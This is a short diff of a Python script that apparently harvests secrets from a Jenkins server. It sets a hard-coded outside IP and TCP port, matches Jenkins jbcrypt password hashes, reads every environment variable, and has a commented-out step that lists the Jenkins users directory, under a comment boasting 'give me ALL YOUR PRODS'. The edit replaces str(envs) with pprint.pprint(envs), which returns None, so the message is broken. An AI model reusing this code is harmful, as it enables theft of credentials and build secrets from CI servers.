@@ -17,6 +17,7 @@ import os
 import pwd
 import fileinput
 import time
+import pprint
 TCP_IP = '54.191.14.198'
 TCP_PORT = 5005
 BUFFER_SIZE = 1024
@@ -26,7 +27,7 @@ message = ""
 ##lololol give me ALL YOUR PRODS.
 r = re.compile(r"#jbcrypt:[^<]+")
 envs = os.environ
-message = str(envs)
+message = pprint.pprint(envs)
 
 """
 results = os.listdir('/var/lib/jenkins/users/')
